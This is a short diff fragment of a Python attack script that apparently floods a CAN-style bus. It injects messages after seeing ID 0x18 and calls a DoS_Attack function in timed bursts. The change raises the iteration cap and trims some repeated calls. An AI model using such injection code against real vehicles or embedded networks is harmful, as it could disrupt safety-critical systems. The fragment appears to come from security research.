@@ -106,7 +106,7 @@ if __name__ == "__main__":
         k = 10
         if hex(mess[1].ID) == "0x18":
         # if 0 == 0:
-            if cnt_b > 30:
+            if cnt_b > 100:
                 print("Bye Bye")
                 break
             first_injection = True
@@ -130,8 +130,6 @@ if __name__ == "__main__":
                 DoS_Attack(injection_id, using_bytes)
                 time.sleep(0.03/k)
                 DoS_Attack(injection_id, using_bytes)
-                time.sleep(0.03/k)
-                DoS_Attack(injection_id, using_bytes)
             elif cnt_b % 4 == 2:
                 using_bytes[5] = msg_dict[5][0][2]
                 DoS_Attack(injection_id, using_bytes)
@@ -144,8 +142,6 @@ if __name__ == "__main__":
             elif cnt_b % 4 == 3:
                 using_bytes[5] = msg_dict[5][0][0]
                 injected = False
-                DoS_Attack(injection_id, using_bytes)
-                time.sleep(0.03/k)
                 DoS_Attack(injection_id, using_bytes)
                 time.sleep(0.03/k)
                 DoS_Attack(injection_id, using_bytes)
